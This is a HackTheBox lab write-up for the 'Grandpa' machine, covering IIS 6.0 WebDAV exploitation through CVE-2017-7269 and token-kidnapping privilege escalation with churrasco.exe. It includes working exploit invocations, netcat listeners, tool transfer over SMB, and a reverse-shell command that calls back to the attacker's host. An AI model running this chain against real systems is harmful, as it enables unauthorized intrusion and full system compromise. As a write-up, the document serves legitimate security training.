# Grandpa — HackTheBox

| Field | Detail |
|---|---|
| OS | Windows Server 2003 SP2 |
| Difficulty | Easy |
| CVE | CVE-2017-7269 |
| Date | March 2026 |
| Result | NT AUTHORITY\SYSTEM |

## Summary

Windows Server 2003 with IIS 6.0 and WebDAV enabled. Initial access via CVE-2017-7269 (buffer overflow in the PROPFIND handler). Privilege escalation via Token Kidnapping (SeImpersonatePrivilege + churrasco.exe).

## Attack Chain

| # | Technique | Result |
|---|---|---|
| 1 | Nmap scan | Port 80, IIS 6.0, WebDAV active |
| 2 | CVE-2017-7269 | RCE as `nt authority\network service` |
| 3 | Token Kidnapping (churrasco.exe) | Privesc to `nt authority\system` |
| 4 | Flag capture | user.txt and root.txt retrieved |

## Reconnaissance

```bash
nmap -sV -sC -p- 10.129.95.233
```

Single open port: 80, Microsoft IIS 6.0. WebDAV active with dangerous methods exposed: PUT, MOVE, COPY, DELETE, PROPFIND.

## Initial Access — CVE-2017-7269

Buffer overflow in the WebDAV PROPFIND handler of IIS 6.0. A malformed `If:` header causes a stack overflow leading to arbitrary code execution.

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — exploit (https://github.com/geniuszly/CVE-2017-7269)
python3 GenWebDavIISExploit.py 10.129.95.233 80 10.10.15.48 4444
```

```
whoami
nt authority\network service
```

## Privilege Escalation — Token Kidnapping

`network service` has `SeImpersonatePrivilege`. On Windows 2003, churrasco.exe exploits this to steal a SYSTEM token.

```bash
# On Kali — serve files
impacket-smbserver share ~/Desktop/htb/grandpa

# On Windows shell
copy \\10.10.15.48\share\churrasco.exe C:\Windows\Temp\churrasco.exe
copy \\10.10.15.48\share\nc.exe C:\Windows\Temp\nc.exe
```

```bash
# Second listener
nc -lvnp 5555

# Execute
C:\Windows\Temp\churrasco.exe "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.15.48 5555"
```

```
whoami
nt authority\system
```

## Flags

```bash
type "C:\Documents and Settings\Harry\Desktop\user.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

> Paths contain spaces — quotes required.

## Lessons Learned

- A system with a single hotfix on Windows 2003 is practically indefensible
- WebDAV with PUT/MOVE/COPY dramatically increases attack surface
- `SeImpersonatePrivilege` = path to SYSTEM on pre-Vista: churrasco (2003), JuicyPotato (2008–2016), RoguePotato/PrintSpoofer (modern)
